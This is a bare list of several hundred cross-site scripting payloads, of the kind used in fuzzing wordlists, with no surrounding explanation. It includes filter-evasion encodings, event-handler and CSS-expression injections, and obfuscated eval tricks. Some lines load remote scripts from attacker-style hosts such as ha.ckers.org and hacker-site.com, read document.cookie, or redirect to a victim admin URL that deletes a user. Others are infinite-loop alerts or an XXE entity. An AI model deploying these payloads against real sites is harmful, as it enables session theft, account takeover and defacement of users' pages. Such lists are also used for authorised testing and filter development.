</script><script>alert(1)</script>
@cc_on@_ok_would_you_like_an_alert
<undefined></undefined>.(alert(1))
top[a='al',b='ev',b+a]('alert(1)')
""@cc_on,x=@cc_on'something'@cc_on
"><script>alert('XSS')</script>    
<img src=1.gif onerror=alert(1337)>
<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;
<;/br style=a:expression(alert())>;
<video poster=javascript:alert(1)//
eval(x.toArray().join('')+'rt(1)');
<A HREF="//www.google.com/">XSS</A>
<img src="javascript:alert('XSS')">
'">><marquee><h1>XSS</h1></marquee>
"><iframe src=http://www.google.de>
SCRIPT>alert(/XSS/.source)</SCRIPT>
<@uni>c=<@/uni>/c/<@uni>[-1]<@/uni>
\u5002_=/e/[\u5001_]+/val/[\u5001_]
{x/*@cc_on=alert@*/}x/*@(/xss/@*/) 
Script(XML()..x.@y?'alert(1)':2.)()
eval===self[490837['toString'](32)]
default xml namespace=e('alert(1)')
<select autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
alert(alert(alert(alert(1).watg))) 
<IMG SRC="javascript:alert('XSS');">
<?='<SCRIPT>alert("XSS")</SCRIPT>'?>
<A HREF="http://1113982867/">XSS</A>
exp/*<A STYLE='no\xss:noxss("*//*");
<A HREF="http://google.com/">XSS</A>
<IMG SRC='vbscript:msgbox(\"XSS\")'>
alert( String(/Test/).substr(1,4) );
<img src=1.gif onerror=alert(close)>
<script/onreadystatechange=alert(1)>
<img src= alt=" onerror=alert(1)//">
find(function(){alert(1,find())}());
([0]['eval'])([{$:'alert(0)'}.$][0])
<@uni>z=<@/uni>/00/<@uni>[-1]<@/uni>
/*@cc_on@set @x=1@*/@cc_on alert(@x)
~@_very_well?alert(1):@_there_you_go
‘; alert(document.cookie); var foo=’
<SCRIPT>alert(/XSS/.source)</SCRIPT>
40) <script x> alert(1) </script 1=2
<@uni>b=<@/uni>/\u/<@uni>[-1]<@/uni>
<;IMG SRC=javascript:alert(';XSS';)>;
</title><script>alert(/xss/)</script>
21) <img src=`xx:xx`onerror=alert(1)>
<XSS STYLE="behavior: url(xss.htc);">
!--" /><script>alert('xss');</script>
<scrscriptipt>alert(1)</scrscriptipt>
<// style=x:expression\28write(1)\29>
<script src="#">{alert(1)}</script>;1
echo('IPT>alert("XSS")</SCRIPT>'); ?>
x[{}].valueOf()(x[/\\/]+(/(1)/)[-1]) 
and:try{1in to}catch(møre){alert(!1)}
a='alert';eval(<{a}>{a}</{a}>+'(a)') 
({strange:'stuff man'}).* = alert(1);
P=function(a,b){return Math.pow(a,b)}
Function.call(undefined,'alert(1)')()
<textarea autofocus onfocus=alert(1)>
<IMG SRC="jav ascript:alert('XSS');">
xss:ex/*XSS*/pression(alert("XSS"))'>
<style>*[{}@import'test.css?]</style>X
" onfocus=alert(document.domain) "> <"
exp/*<XSS STYLE='no\xss:noxss("*//*");
<IMG SRC=JaVaScRiPt:alert("XSS<WBR>")>
<SCRIPT SRC=http://ha.ckers.org/xss.js
<A HREF="http://66.102.7.147/">XSS</A>
<IMG LOWSRC="javascript:alert('XSS')">
33) <script>+-+-1-+-+alert(1)</script>
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
12) <iframe/src \/\/onload = prompt(1)
<IMG DYNSRC="javascript:alert('XSS')">
<img src=foo.png onerror=alert(\1\) \>
<img src=foo.png onerror=alert(/1/) />
"></iframe><script>alert(123)</script>
({}).valueOf.call(null).alert('lose');
&#21477;=/e/[&#54280;]+/val/[&#54280;]
top/**/['\x61\x6c\x65\x72\x74']/**/(1)
o={"b"getter:Function('alert(1)')},o.b
'></select><script>alert(123)</script>
<iframe "onload=alert(/XSS/)></iframe> 
35) <script ~~~>alert(0%0)</script ~~~>
<IMG DYNSRC="javascript:alert('XSS');">
<;IMG SRC=";javascript:alert(';XSS';)";
<;SCRIPT SRC=http://ha.ckers.org/xss.js
<br size=\"&{alert(&#039;XSS&#039;)}\">
<img src=&{document.vulnerable=true;};>
<br SIZE="&{document.vulnerable=true}">
<body ONLOAD=document.vulnerable=true;>
<IMG"""><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC="  javascript:alert('XSS');">
<IMG LOWSRC="javascript:alert('XSS');">
with(this)watch('XSS',alert),XSS=false 
\u5003_=/a/[\u5001_]+/lert(1)/[\u5001_]
\u0063\u003d/c/\u005b\u002d\u0031\u005d
<image src="" onerror="alert(/XSS/)" />
<input onblur=focus() autofocus><input>
<b><script<b></b><alert(1)</script </b>
'"></title><script>alert(1111)</script>
13) <iframe/onreadystatechange=alert(1)
<IMG SRC="jav   ascript:alert('XSS');">
<SCRIPT>document.write("XSS");</SCRIPT>
<IMG LOWSRC=\"javascript:alert('XSS')\">
<table background="javascript:alert(1)">
<BASE HREF="javascript:alert('XSS');//">
<BGSOUND SRC="javascript:alert('XSS');">
</textarea><script>alert(/xss/)</script>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<script>var var = 1; alert(var)</script>
<body oninput=alert(1)><input autofocus>
<IMG DYNSRC=\"javascript:alert('XSS')\">
<;/script>;<;script>;alert(1)<;/script>;
<;IMG SRC=';vbscript:msgbox(";XSS";)';>;
<SCRIPT>a=/XSS/nalert(a.source)</SCRIPT>
<iframe/ "onload=alert(/XSS/)></iframe> 
<img src onerror /" '"= alt=alert(1)//">
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(write(1))}</style>
<div style=content:url(test2.svg)></div>
\u0062\u003d/\u/\u005b\u002d\u0031\u005d
\u007a\u003d/00/\u005b\u002d\u0031\u005d
this.watch('_',function(){return eval});
.0.*?1.:Script(.0.*?1.:'\134u006eame')()
<iframe/ /onload=alert(/XSS/)></iframe> 
eval(toNonAscii("return alert"))('123'); 
Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
34) <body/onload=&lt;!--&gt;&#10alert(1)>
<A HREF="http://www.google.com./">XSS</A>
<script>alert(document.location)</script>
""@cc_on,x=@anything 'something'@anything
“><ScRiPt>alert(document.cookie)</script>
<body onLoad="while(true) alert('XSS');">
[~alert(1)] --> writes -1 instead of NaN.
<TD BACKGROUND="javascript:alert('XSS')">
%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
<body onload="document.vulnerable=true;">
</XSS STYLE=xss:expression(alert('XSS'))>
<;A HREF=";//www.google.com/";>;XSS<;/A>;
<;scrscriptipt>;alert(1)<;/scrscriptipt>;
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
42)  <--`<img/src=` onerror=alert(1)> --!>
eval((['ale','rt(1)']+'').replace(/,/,''))
<body onunload="javascript:alert('XSS');">
alert(String.fromCharCode(88,83,83));'))">
10) <%<!--'%><script>alert(1);</script -->
<img src=foo.png onerror=alert(/xssed/) />
<IMG SRC="jav&#x09;ascript:alert('XSS');">
src="http://www.site.com/XSS.js"></script>
<XSS STYLE="xss:expression(alert('XSS'))">
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
"/></a></><img src=1.gif onerror=alert(1)>
[_=alert,__=document.cookie]&delete-_(__) 
“><script >alert(document.cookie)</script>
<script>({0:#0=alert/#0#/#0#(0)})</script>
document.body.innerHTML=name location=name
s=String((/S/+[])[1]+v+x+i+o+(/g/+[])[1]);
&#22924;=/a/[&#54280;]+/lert(1)/[&#54280;]
<object data=jav&#x61script:\u0061lert(2)>
"><script>ale rt('XSS');</s c r i p t><!--
<script>document.vulnerable=true;</script>
Ľscriptľdocument.vulnerable=true;Ľ/scriptľ
<~/XSS STYLE=xss:expression(alert('XSS'))>
<;IMG SRC=";javascript:alert(';XSS';);";>;
exp/*<;XSS STYLE=';no\xss:noxss(";*//*";);
<;<;SCRIPT>;alert(";XSS";);//<;<;/SCRIPT>;
<;A HREF=";http://1113982867/";>;XSS<;/A>;
<;A HREF=";http://google.com/";>;XSS<;/A>;
/./(".")['ev'+''+''+'al']('a'+'ler'+'t(1)')
+-0?+-1:!1?+-0:+-0?+-1:+-1/alert(1)?+-1:+-1
alert(uneval(/eval/).replace(/\//g, [ ] ));
data:text/html,<script>location+=1</script>
<div style="font-family:foo}color=red;">XXX
<script>/*</script*>*/alert('XSS')</script>
<div style="binding: url([link to code]);">
&<script>document.vulnerable=true;</script>
<img src="mocha:document.vulnerable=true;">
<<script>document.vulnerable=true;</script>
XSS STYLE=xss:e/**/xpression(alert('XSS'))>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
tt      p://6&#9;6.000146.0x7.147/">XSS</A>
<BODY BACKGROUND="javascript:alert('XSS')">
alert(atob('amF2YXNjcmlwdDphbGVydCgxKQ')); 
<img src="x` `<script>alert(1)</script>"` `>
<img src= alt=" hello=">" onerror=alert(1)> 
<iframe///////onload=alert(/XSS/)></iframe> 
this["window"]["top"]["window"]["alert"](5);
'">><<<iMg sRc=1.gif onerror = alert("1")>>>
<TABLE BACKGROUND="javascript:alert('XSS')">
<;/TITLE>;<;SCRIPT>;alert("XSS");<;/SCRIPT>;
<;A HREF=";http://66.102.7.147/";>;XSS<;/A>;
<;br size=\";&;{alert(&#039;XSS&#039;)}\";>;
<BODY BACKGROUND="javascript:alert('XSS');">
$\u5002=/u61u6cu65u72u74u28u31u29/[-$\u5003]
[url=javascript:alert('XSS');]click me[/url]
<% foo><x foo="%><script>alert(1)</script>">
<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">
41) <div/onmouseover='alert(1)'> style="x:">
<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">
17) http://www.<script>alert(1)</script .com
<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">
<A HREF="http://ha.ckers.org@google">XSS</A>
<IMG SRC=" &#14;  javascript:alert('XSS');">
<A HREF="http://google:ha.ckers.org">XSS</A>
<img src=&{document.write("XSS-XSS-XSS");};>
<;IMG DYNSRC=";javascript:alert(';XSS';);";>;
<script <B>document.vulnerable=true;</script>
"><script>alert(document.location)</script><"
<video><source onerror="javascript:alert(1)">
<video onerror="javascript:alert(1)"><source>
<?xml-stylesheet href="javascript:alert(1)"?>
foo%00<script>alert(document.cookie)</script>
<img src=asdf onerror=alert(document.cookie)>
['I like'],{g:0in~/*for another*/~alert(!!1)}
Function.apply(undefined,['s','alert(s)'])(1)
<div onmouseover="document.vulnerable=true;">
<div style="behaviour: url([link to code]);">
<;IMG LOWSRC=";javascript:alert(';XSS';);";>;
<img SRC='vbscript:document.vulnerable=true;'>
4) <sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
“><<script>alert(document.cookie);//<</script>
execScript('Dim a(1)\na(0)="ale"','vbscript');
<;BGSOUND SRC=";javascript:alert(';XSS';);";>;
<;BASE HREF=";javascript:alert(';XSS';);//";>;
new({b setter:Function}.b='alert\x28\x31\x29')
<DIV STYLE="width: expression(alert('XSS'));">
43) <iframe/%00/ src=javaSCRIPT&colon;alert(1)
eval(/a......./.exec(/#####alert(1)#####/)[0])
.0.*?1.:Script(.0.*?1.:'eval(\134u006eame)')()
<input type="text" AUTOFOCUS onfocus=alert(1)>
</br style=a:expression(alert())>             
<A HREF="hntttp://6 6.000146.0x7.147/">XSS</A>
<body onload="document.write("XSS-XSS-XSS");">
<<SCRIPT>document.vulnerable=true;//<</SCRIPT>
“><s”%2b”cript>alert(document.cookie)</script>
XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
[color=red width=expression(alert(123))][color]
<![><img src="]><img src=x onerror=alert(1)//">
<IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">
<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
<IMG SRC="jav&#x09;ascript:alert(<WBR>'XSS');">
<;A HREF=";http://www.google.com./";>;XSS<;/A>;
<;IMG SRC=javascript:alert(&;quot;XSS&;quot;)>;
<scr<script>ipt>alert('XSS');</scr</script>ipt>
<a href="javascript#document.vulnerable=true;">
<img SRC="javascript:document.vulnerable=true;"
javascript:NaN = window;eval(0/0+".alert(1)"); 
javascript: number = alert; eval(typeof(1))(1);
name='alert(/Chloe is gorgeous (my daughter)/)'
window.watch('a',function(a){return a+'lert'});
document.location.toSource()[e]('ale'+'rt(1)') 
eval(\u002fale\rt(1)/[-1].replace(/\\|\n/g,''));
new Function('\141\154\145\162\164\50\61\51')();
<;IMG SRC=";jav&#x09;ascript:alert(';XSS';);";>;
<event-source src="event.php" onload="alert(1)">
<svg><style>&ltimg/src=x onerror=alert(1)// </b>
<? foo="><x foo='?><script>alert(1)</script>'>">
<!--<img src="--><img src=x onerror=alert(1)//">
<form><button formaction="javascript:alert(1)">X
<marquee><script>alert('XSS')</script></marquee>
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
@if(@_mc680x0)@else alert(@_jscript_version)@end
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
<;XSS STYLE=";xss:expression(alert(';XSS';))";>;
<xml src="javascript:document.vulnerable=true;">
<img src="livescript:document.vulnerable=true;">
<img SRC="javascript:document.vulnerable=true;">
"\><\a><\><img src=foo.png onerror=alert(\1\) \>
<body onload="javascript:alert(([code])"></body>
<img src="mocha:document.write("XSS-XSS-XSS");">
&<script>document.write("XSS-XSS-XSS");</script>
<iframe src=http://ha.ckers.org/scriptlet.html <
window["window"]["window"]["window"]["alert"](3);
38) <svg><script onlypossibleinopera:-)> alert(1)
<;IMG SRC=";jav&;#x09;ascript:alert(';XSS';);";>;
</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
<iframe src="vbscript:document.vulnerable=true;">
<img SRC="jav ascript:document.vulnerable=true;">
%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
<BODY onload!#$%&()*~+-_.,:;?@[/]^`=alert("XSS")>
<;IMG SRC=";jav&;#x0A;ascript:alert(';XSS';);";>;
</script><script >alert(document.cookie)</script>
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
12) &#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
9) <img src="/" =_=" title="onerror='prompt(1)'">
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
5) <img/src=`%00` onerror=this.onerror=confirm(1)
<;IMG SRC=";jav&;#x0D;ascript:alert(';XSS';);";>;
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
<;A HREF=";http://ha.ckers.org@google";>;XSS<;/A>;
<;A HREF=";http://google:ha.ckers.org";>;XSS<;/A>;
"><STYLE>@import"javascript:alert('XSS')";</STYLE>
%3C/script%3E%3Cscript%3Ealert%281%29%3C/script%3E
<input onblur=write(1) autofocus><input autofocus>
@cc_on@set@_=5e-324@_?alert(@set@alert=1@alert):@_
eval('ale'+/............../.__proto__[-1]+'rt(1)')
data:text/html,<script>location+=location</script>
?test=" type="image" src="x" onerror="alert(/XSS/)
$\u5002=$\u5002[/replace/[-$\u5003]](/u/g,$\u5001)
eval((['alee','(rt(1(,))']+'').replace(/.,./g,''))
Function(<text>\u0061{new String}lert(1)</text>)()
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js...
<div onmouseover="document.write("XSS-XSS-XSS");">
script-typetextjavascriptalertdocumentcookiescript
&#39;">><<<iMg sRc = 1.gif onerror = alert("1")>>>
</title><SCRIPT>document.vulnerable=true;</script>
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
<;BODY BACKGROUND=";javascript:alert(';XSS';);";>;
2) <div onmouseover='alert&lpar;1&rpar;'>DIV</div>
26) <img/src=@&#32;&#13; onerror = prompt('&#49;')
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<;IFRAME SRC=http://ha.ckers.org/scriptlet.html <;
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
<script language="JavaScript">alert('XSS')</script>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
27) <style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
21) <img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
>"><ScRiPt%20%0a%0d>alert(561177485777)%3B</ScRiPt>
<x '="foo"><x foo='><img src=x onerror=alert(1)//'>
<div style="font-family:'foo&#10;;color:red;';">XXX
<meta charset="mac-farsi">¼script¾alert(1)¼/script¾
<style> BODY{-moz\00002dbinding:url(URL)} </style> 
[$='ale'+'rt(1)']|[_=frames['Fun'+'ction']]|_($)() 
window.window.window.window.window.window.alert(2);
<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>
<iframe src="javascript:document.vulnerable=true; <
<script>a=/XSS/\ndocument.vulnerable=true;</script>
<img DYNSRC="javascript:document.vulnerable=true;">
<img LOWSRC="javascript:document.vulnerable=true;">
<;IMG SRC="; &;#14;  javascript:alert(';XSS';);";>;
'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
µ=<µ ß='le' µ='a' ø='rt'></µ>,top[µ.@µ+µ.@ß+µ.@ø](µ)
Date [decodeURI('e%76al')] (decodeURI('a%6Cert(1)'))
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
<div style="x:expression((window.r==1)?'':eval('r=1;
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
15) <input value=<><iframe/src=javascript:confirm(1)
7) <img src=`%00`&NewLine; onerror=alert(1)&NewLine;
26) <svg contentScriptType=text/vbs><script>MsgBox+1
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
a=/aalertt/;/a(.*)t/.test(a),a=eval(RegExp.$1),a(0) 
7) <var onmouseover="prompt(1)">On Mouse Over</var>​
eval('(' + typeof setTimeout + '(){ alert(1) })()');
<TABLE BACKGROUND="javascript:alert('XSS')"></TABLE>
<;DIV STYLE=";width: expression(alert(';XSS';));";>;
<;SCRIPT SRC=http://ha.ckers.org/xss.js>;<;/SCRIPT>;
<base HREF="javascript:document.vulnerable=true;//">
<bgsound SRC="javascript:document.vulnerable=true;">
<a href="javascript#document.write("XSS-XSS-XSS");">
<script/src=data:text/javascript,alert(1)></script> 
alert(Anything[-6]); // alerts the string "Anything"
(0).constructor.constructor('return alert("\141")')()
<!-- -- -- -- --<script>alert('XSS')</script> -- --> 
<a href= harmless=" onmouseover=alert(1)//">test</a> 
<script src="data:text/javascript,alert(1)"></script>
 with(' the help of'+ typeof AnYThing )alert(1);s :-P
<p onmousemove="alert(/XSS/)">Long paragraph here</p>
<script>alert(String.fromCharCode(88,83,83))</script>
<!DOCTYPE x[<!ENTITY x SYSTEM "test.xxe">]><y>&x;</y>
24) <math><a xlink:href="//jsfiddle.net/t846h/">click
</textarea>'"><script>alert(document.cookie)</script>
47) <math><a xlink:href="//jsfiddle.net/t846h/">click
"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
36) <img src ?itworksonchrome?\/onerror = alert(1)​​​
<img src="livescript:document.write("XSS-XSS-XSS");">
<img src="javascript:document.write("XSS-XSS-XSS");">
<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
<;IMG ";";";>;<;SCRIPT>;alert(";XSS";)<;/SCRIPT>;";>;
<style>@im\port'\ja\vasc\ript:alert(\"XSS\")';</style>
<input type="image" src="x" onerror="alert(/XSS/)" /> 
&#21477;=RegExp(/e/)[&#54280;]+RegExp(/val/)[&#54280;]
Here's how to create a string from any function name:-
javascript: x = window;y=document; x.alert(y.cookie); 
perl -e 'print "<SCRIPT>alert("XSS")</SCRIPT>";' > out
<iframe src="vbscript:document.write("XSS-XSS-XSS");">
['ale'+'rt'].map(top['ev'+'al'])[0]['valu'+'eOf']()(1)
<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
<XSS STYLE="xss:expression(document.vulnerable=true)">
<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
49) </plaintext\></|\><plaintext/onmouseover=prompt(1)
37) <svg><script>//&NewLine;confirm(1);</script </svg>
4) <a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<table background="javascript:alert(([code])"></table>
<font style='color:expression(alert(document.cookie))'>
"><script alert(String.fromCharCode(88,83,83))</script>
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<?import namespace="t" implementation="#default#time2">
<script src=http://yoursite.com/your_files.js></script>
1) <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
<;A HREF=";http://0102.0146.0007.00000223/";>;XSS<;/A>;
<;A HREF=";http://0x42.0x0000066.0x7.0x93/";>;XSS<;/A>;
<;IMG STYLE=";xss:expr/*XSS*/ession(alert(';XSS';))";>;
<img src="blah"onmouseover="document.vulnerable=true;">
<img SRC=" &#14; javascript:document.vulnerable=true;">
>%22%27><img%20src%3d%22javascript:alert(%27XSS%27)%22>
blur['con'+'structor']('_','eva'+'l(_)')('a'+'lert(1)')
top[(Number.MAX_VALUE/45268).toString(36).slice(15,19)]
\u0030\u005b'\145\166\x61\x6C'\u005d\u0028\u0065\u0029 
typeof setTimeout('\x61\x6c\x65\x72\x74\x28\x31\x29',0)
//<style>*{color:red}</style><script> {eval(name)}body 
<x style="background:url('x&#1;;color:red;/*')">XXX</x>
<title onpropertychange=alert(1)></title><title title=>
%253cscript%253ealert(document.cookie)%253c/script%253e
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<input name="test" value="<?php echo $_GET['test']?>" />
eval(['alee','(rt(1(,))'].toString().replace(/.,./g,''))
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
<? echo('<scr)'; echo('ipt>alert(\"XSS\")</script>'); ?>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
9) <ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
19) <form><a href="javascript:\u0061lert&#x28;1&#x29;">X
'>"><script src = 'http://www.site.com/XSS.js'></script>
<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
<;IMG SRC=`javascript:alert(";RSnake says, ';XSS';";)`>;
<;IFRAME SRC=";javascript:alert(';XSS';);";>;<;/IFRAME>;
<div datafld="b" dataformatas="html" datasrc="#X"></div>
<![<!--]]<script>document.vulnerable=true;//--></script>
<body BACKGROUND="javascript:document.vulnerable=true;">
<img dynsrc="javascript:document.write("XSS-XSS-XSS");">
<style><img src="</style><img src=x onerror=alert(1)//">
{color:red;xss:expression(window.x?0:(eval(name),x=1))} 
<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
<img src="blah>" onmouseover="document.vulnerable=true;">
<;SCRIPT SRC=";http://ha.ckers.org/xss.jpg";>;<;/SCRIPT>;
<iframe<?php echo chr(12)?> onload=alert(/XSS/)></iframe>
<bgsound src="javascript:document.write("XSS-XSS-XSS");">
<XSS STYLE="behavior: url(http://ha.ckers.org/xss.htc);">
<table BACKGROUND="javascript:document.vulnerable=true;">
+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;
41) <marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
[color=red' onmouseover="alert('xss')"]mouse over[/color]
<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>
11) <script src="data:text/javascript,alert(1)"></script>
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<iframe<?php echo chr(11)?> onload=alert(/XSS/)></iframe> 
&#22924;=RegExp(/a/)[&#54280;]+RegExp(/lert(1)/)[&#54280;]
<var onmousemove="alert(/XSS/)">Long paragraph here</var> 
>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
eval((function ale(){}).name+(function rt(){}).name+'(1)')
* {-o-link:'javascript:alert(1)';-o-link-source: current;}
<div style=width:1px;filter:glow onfilterchange=alert(1)>x
<LAYER SRC="javascript:document.vulnerable=true;"></LAYER>
<SCRIPT ="blah" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
perl -e 'print "<IMG SRC=javascript:alert("XSS")>";' > out
11) <script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
30) &#00;</form><input type&#61;"date" onfocus="alert(1)">
<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>
6) <form><isindex formaction="javascript&colon;confirm(1)"
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<div STYLE="width: expression(document.vulnerable=true);">
<;STYLE>;@import';http://ha.ckers.org/xss.css';;<;/STYLE>;
<A HREF="h&#x0A;tt&#09;p://6&#09;6.000146.0x7.147/">XSS</A>
<script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>
32) <object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
42) <div/style="width:expression(confirm(1))">X</div> {IE7}
//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));
<div style="width: expression(document.vulnerable=true;);">
<;INPUT TYPE=";IMAGE"; SRC=";javascript:alert(';XSS';);";>;
<a href="about:<script>document.vulnerable=true;</script>">
<;STYLE TYPE=";text/javascript";>;alert(';XSS';);<;/STYLE>;
<;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>;
perl -e 'print "&<SCR\0IPT>alert("XSS")</SCR\0IPT>";' > out
perl -e 'print "<IMG SRC=java\0script:alert("XSS")>";'> out
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<;STYLE>;@im\port';\ja\vasc\ript:alert(";XSS";)';;<;/STYLE>;
<object allowscriptaccess="always" data="test.swf"></object>
['ale'+'rt']['m'+'ap'](top['ev'+'al'])[0]['valu'+'eOf']()(1)
<a onclick="URL='javascript:alert(/XSS/)'" href="#">Test</a>
if(false)sdfasdfsad(),dasfasdfsfd,fasdfsdfs();else alert(1);
";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
<;SCRIPT/XSS SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115....> 
<;XML SRC=";http://ha.ckers.org/xsstest.xml"; ID=I>;<;/XML>;
<;TABLE BACKGROUND=";javascript:alert(';XSS';)";>;<;/TABLE>;
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
28) <script ^__^>alert(String.fromCharCode(49))</script ^__^
}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<IFRAME SRC="javascript:document.vulnerable=true;"></iframe>
<;XSS STYLE=";behavior: url(http://ha.ckers.org/xss.htc);";>;
<img STYLE="xss:expr/*XSS*/ession(document.vulnerable=true)">
<table><TD BACKGROUND="javascript:document.vulnerable=true;">
<TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE>
javascript:if(typeof%20wWXzys==typeof%20alert)wWXzys();alert(
33) <iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>
3) <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
document.body.runtimeStyle.cssText = '1:expression(alert(1))'
X<x style=`behavior:url(#default#time2)` onbegin=`write(1)` >
<style>@import "data:,*%7bx:expression(write(1))%7D";</style>
<link rel=stylesheet href=data:,*%7bx:expression(write(1))%7d
<comment><img src="</comment><img src=x onerror=alert(1))//">
perl -e 'print \"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>\";' > out
<A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>
46) <form><button formaction=javascript&colon;alert(1)>CLICKME
2) <svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
<script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>
((Number.MAX_VALUE/99808).toString(36).slice(71,76)+'("XSS")')
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
<script SRC="http://www.securitycompass.com/xss.jpg"></script>
<;LAYER SRC=";http://ha.ckers.org/scriptlet.html";>;<;/LAYER>;
<SCRIPT a="blah" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<;LINK REL=";stylesheet"; HREF=";javascript:alert(';XSS';);";>;
Redirect 302 /a.jpg http://victimsite.com/admin.asp&;deleteuser
<style>@import'http://www.securitycompass.com/xss.css';</style>
<style TYPE="text/javascript">document.vulnerable=true;</style>
<input TYPE="IMAGE" SRC="javascript:document.vulnerable=true;">
</script></script><<<<script><>>>><<<script>alert(123)</script>
<html><noalert><noscript>(123)</noscript><script>(123)</script>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
'""><script language="JavaScript"> alert('X \nS \nS');</script>
36) <style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
<;SCRIPT a=`>;` SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
<SCRIPT FOR=document EVENT=onreadystatechange>alert(1)</SCRIPT>
<script>history.pushState(0,0,'/i/am/somewhere_else');</script>
location=<text>javascr{new Array}ipt:aler{new Array}t(1)</text>
<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>
35) <script itworksinallbrowsers>/*<script* */alert(1)</script ​
